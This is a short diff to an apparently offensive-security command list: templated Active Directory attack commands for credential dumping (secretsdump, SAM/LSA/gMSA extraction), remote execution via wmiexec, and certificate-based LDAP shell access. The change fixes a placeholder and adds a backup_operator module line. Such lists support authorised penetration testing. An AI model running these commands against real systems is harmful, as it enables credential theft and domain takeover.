@@ -42,10 +42,11 @@
       "impacket-secretsdump {{DOMAIN}}/{{USER}}:'{{PASSWORD}}'@{{IP}}",
       "impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL",
       "impacket-wmiexec {{DOMAIN}}/{{USER}}:'{{PASSWORD}}'@{{IP}}",
-      "netexec ldap {IP} -u {{USER}} -p '{{PASSWORD}} -d {{DOMAIN}} --gmsa,",
+      "netexec ldap {{IP}} -u {{USER}} -p '{{PASSWORD}} -d {{DOMAIN}} --gmsa,",
       "python3 gMSADumper.py -u {{USER}} -p '{{PASSWORD}}' -d {{DOMAIN}}",
       "netexec smb {{IP}} --local-auth -u {{USER}} -p '{{PASSWORD}}' --sam",
       "netexec smb {{IP}} --local-auth -u {{USER}} -p '{{PASSWORD}}' --lsa",
+      "nxc smb {{IP}} -u {{USER}} -p '{{PASSWORD}}' -M backup_operator",
       "impacket-reg {{DOMAIN}}/{{USER}}:{{PASSWORD}}@{{IP}} query -keyName HKLM\\SOFTWARE\\",
       "certipy-ad auth -pfx administrator.pfx -ldap-shell -dc-ip {{IP}}"
     ]
